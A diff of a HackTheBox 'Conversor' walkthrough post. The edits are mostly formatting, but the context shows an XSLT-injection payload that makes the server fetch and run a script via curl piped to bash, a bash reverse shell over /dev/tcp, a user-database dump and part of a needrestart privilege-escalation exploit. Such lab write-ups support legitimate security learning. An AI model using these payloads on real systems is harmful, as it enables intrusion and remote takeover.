@@ -1,23 +1,17 @@
 ---
-title: "HackTheBox — Conversor Walkthrough (10.10.11.92)"
+title: "Conversor @ HTB"
 date: 2025-12-05
 categories: [HackTheBox, Easy]
 tags: [xslt-injection, cve]
 ---
 
 
-
-> **Machine:** Conversor
-
-> **IP:** 10.10.11.92
-
-> **Difficulty:** Easy
-
+<img width="300" height="243" alt="image" src="https://github.com/user-attachments/assets/f8a6025e-a1ce-4c2e-b8ae-5545e03b6bf0" />
 
 
 ---
 
-### [~] Enumeration:~#
+### Enumeration:~#
 
 Scanning the ip address with nmap reveals a standard Ubuntu web server setup.
 
@@ -35,13 +29,15 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### [!] Web_Exploitation:~#
+### Web_Exploitation:~#
 The application allows users to upload XML and XSLT files for conversion.
+
+<img width="1501" height="761" alt="image" src="https://github.com/user-attachments/assets/e69a18bc-55c9-4091-9194-5eddcc836c38" />
 
 
 I exploited this by creating a malicious .xslt file that uses the EXSLT extension to write a Python reverse shell directly onto the server's script directory.
 
-exploit.xslt:
+**exploit.xslt:**
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet 
@@ -59,12 +55,13 @@ os.system("curl 10.10.14.81:8000/shell.sh|bash")
 </xsl:stylesheet>
 ```
 
-shell.sh
-```#!/bin/bash                                     
+**shell.sh**
+```
+#!/bin/bash                                     
 bash -i >& /dev/tcp/10.10.14.81/9001 0>&1
 ```
 
-### [#] Lateral_Movement:~#
+### Lateral_Movement:~#
 Enumerating the web directory, I found a SQLite database `users.db`.
 `sqlite3 users.db "select * from users;"`
 
@@ -87,7 +84,7 @@ I then go the user flag from the home directory
 
 `ee60e29be186b90b58c5c9caf4a6ab09`
 
-### Privilege_Escalation
+### Privilege_Escalation:~#
 Checking `sudo -l`, I found that I can run /usr/bin/needrestart as root. 
 This version is vulnerable to CVE-2024–48990. Since the target didn't gcc, I compiled the exploit library locally and transferred it over to the machine.
 lib.c script
@@ -113,7 +110,7 @@ void a() {
 ```
 Then I compiled it with gcc
 
-runner.sh script
+**runner.sh** script
 ```
 #!/bin/bash
 set -e
